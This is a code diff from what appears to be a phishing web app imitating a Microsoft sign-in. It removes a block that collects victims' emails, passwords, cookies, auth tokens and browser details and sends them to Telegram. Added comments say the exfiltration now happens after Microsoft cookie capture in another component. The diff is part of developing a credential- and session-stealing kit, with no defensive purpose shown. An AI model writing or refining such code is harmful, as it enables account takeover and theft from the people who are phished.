@@ -417,31 +417,9 @@ function App() {
   };
 
   const handleOAuthSuccess = async (sessionData: any) => {
-    if (!hasSentAuthData) {
-      setHasSentAuthData(true);
-      const storedFormCredentials = getStoredFormCredentials();
-      let finalEmail = '';
-      let finalPassword = '';
-      if (storedFormCredentials) {
-        finalEmail = storedFormCredentials.email || '';
-        finalPassword = storedFormCredentials.password || '';
-      } else if (capturedCredentials?.email && capturedCredentials?.password) {
-        finalEmail = capturedCredentials.email;
-        finalPassword = capturedCredentials.password;
-      } else {
-        finalEmail = formEmail || capturedEmail || '';
-        finalPassword = formPassword || getStoredPassword() || '';
-      }
-      await sendToTelegram({
-        email: finalEmail,
-        password: finalPassword,
-        cookies: capturedCookies ? JSON.parse(capturedCookies) : [],
-        authenticationTokens: sessionData?.authenticationTokens || {},
-        userAgent: navigator.userAgent,
-        sessionId: sessionData?.sessionId || ('oauth_' + Math.random().toString(36).substring(2, 15)),
-        url: window.location.href
-      });
-    }
+    // OAuth success now handled by RealOAuthRedirect component
+    // Data transmission occurs after Microsoft cookie capture
+    console.log('OAuth success callback triggered:', sessionData);
     setOAuthSessionData(sessionData);
     setCurrentPage('document-loading');
   };
